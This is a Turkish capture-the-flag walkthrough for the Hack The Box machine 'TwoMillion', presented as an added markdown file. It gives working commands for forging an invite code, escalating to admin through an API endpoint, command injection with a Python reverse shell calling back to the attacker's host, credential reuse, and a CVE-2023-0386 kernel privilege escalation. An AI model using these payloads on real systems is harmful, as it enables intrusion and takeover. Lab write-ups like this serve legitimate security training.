@@ -1,0 +1,238 @@
+## Keşif (Reconnaissance)
+
+### Port Tarama
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 -oA full_scan ip
+```
+
+Açık portlar:
+
+Port  Servis 
+------ --------
+22  OpenSSH 8.9p1 (Ubuntu) |
+80  nginx → http://2million.htb/ 
+
+`/etc/hosts`'a eklendi:
+```
+ip 2million.htb
+```
+
+---
+
+## Web Uygulaması Keşfi
+
+Site eski HTB arayüzünü simüle ediyor. `/invite` sayfasında kayıt olmak için bir davet kodu gerekiyor.
+
+### Invite Code — JS Deobfuscation
+
+`/js/inviteapi.min.js` dosyası pack/obfuscate edilmiş:
+
+```javascript
+eval(function(p,a,c,k,e,d){...}(...))
+```
+
+Deobfuscate edince iki fonksiyon çıkıyor:
+- `makeInviteCode()` → `POST /api/v1/invite/how/to/generate`
+- `verifyInviteCode(code)` → `POST /api/v1/invite/verify`
+
+### Davet Kodu Üretme
+
+```bash
+curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
+```
+
+```json
+{
+  "data": {
+    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
+    "enctype": "ROT13"
+  }
+}
+```
+
+ROT13 decode:
+```
+In order to generate the invite code, make a POST request to /api/v1/invite/generate
+```
+
+```bash
+curl -s -X POST http://2million.htb/api/v1/invite/generate
+# {"data":{"code":"BASE64==","format":"encoded"}}
+```
+
+Base64 decode → `XXXXX-XXXXX-XXXXX-XXXXX` formatında davet kodu.
+
+### Kayıt ve Giriş
+
+Form `password_confirmation` alanı da istiyor:
+
+```bash
+curl -s -X POST http://2million.htb/api/v1/user/register \
+  -d "code=INVITE&username=hax0r99&email=hax0r99@hack.local&password=Hax0r1234!&password_confirmation=Hax0r1234!"
+
+curl -s -c cookies.txt -X POST http://2million.htb/api/v1/user/login \
+  -d 'email=hax0r99@hack.local&password=Hax0r1234!'
+# → /home'a redirect, PHPSESSID cookie alındı
+```
+
+---
+
+## API Keşfi
+
+```bash
+curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=SESSION"
+```
+
+```json
+{
+  "v1": {
+    "user": { ... },
+    "admin": {
+      "GET":  { "/api/v1/admin/auth": "Check if user is admin" },
+      "POST": { "/api/v1/admin/vpn/generate": "Generate VPN for specific user" },
+      "PUT":  { "/api/v1/admin/settings/update": "Update user settings" }
+    }
+  }
+}
+```
+
+---
+
+## İlk Erişim (Initial Access)
+
+### Kendini Admin Yapma
+
+`/api/v1/admin/settings/update` endpoint'i herhangi bir kullanıcıyı admin yapabiliyor:
+
+```bash
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
+  -H "Cookie: PHPSESSID=SESSION" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"hax0r99@hack.local","is_admin":1}'
+# {"id":13,"username":"hax0r99","is_admin":1}
+```
+
+### Command Injection — VPN Generate
+
+`/api/v1/admin/vpn/generate` endpoint'i `username` parametresini shell komutuna doğrudan geçiriyor:
+
+```bash
+# Test
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Cookie: PHPSESSID=SESSION" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test;id #"}'
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+RCE doğrulandı.
+
+### Reverse Shell
+
+Kali'de listener:
+```bash
+nc -lvnp 443
+```
+
+Python3 reverse shell payload:
+
+```bash
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Cookie: PHPSESSID=SESSION" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test;python3 -c '"'"'import socket,subprocess,os;s=socket.socket();s.connect(("tun0",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"' #"}'
+```
+
+Shell: `uid=33(www-data)`
+
+---
+
+## User Flag
+
+
+### Credential Discovery
+
+Web root'ta `.env` dosyası:
+
+```bash
+cat /var/www/html/.env
+```
+
+```
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=*
+DB_PASSWORD=*
+```
+
+### SSH ile Giriş
+
+DB şifresi OS kullanıcısıyla aynı (şifre reuse):
+
+```bash
+ssh *@2million.htb
+# şifre: *
+```
+
+```bash
+cat ~/user.txt
+#     *
+```
+
+---
+
+## Privilege Escalation — CVE-2023-0386
+
+### İpucu
+
+```bash
+cat /var/mail/admin
+```
+
+```
+Subject: Urgent: Patch System OS
+...
+That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+```
+
+### Kernel Versiyonu
+
+```bash
+uname -a
+# Linux 2million 5.15.70-051570-generic #202209231339
+```
+
+Kernel 5.15.70 → **CVE-2023-0386** vulnerable!
+
+### CVE-2023-0386 Nedir?
+
+Linux OverlayFS'te SUID bit koruması bypass açığı. Düşük yetkili kullanıcı, FUSE ile fake bir setuid binary oluşturuyor ve OverlayFS üzerinden kopyalarken kernel SUID bitini koruyor. Binary çalıştırılınca root shell veriliyor.
+
+### Exploit
+
+Kali'de derle ve hedefe gönder:
+
+```bash
+sudo apt install libfuse-dev -y
+git clone https://github.com/sxlmnwb/CVE-2023-0386
+cd CVE-2023-0386
+make
+cd ..
+scp -r CVE-2023-0386 admin@2million.htb:/tmp/
+```
+
+Hedefte **iki terminal** ile çalıştır:
+
+**Terminal 1:**
+```bash
+cd /tmp/CVE-2023-0386
+./fuse ./ovlcap/lower ./gc
+```
+
+**Terminal 2:**
+```bash
+cd /tmp/CVE-2023-0386
+./exp
+# root shell!
+cat /root/root.txt
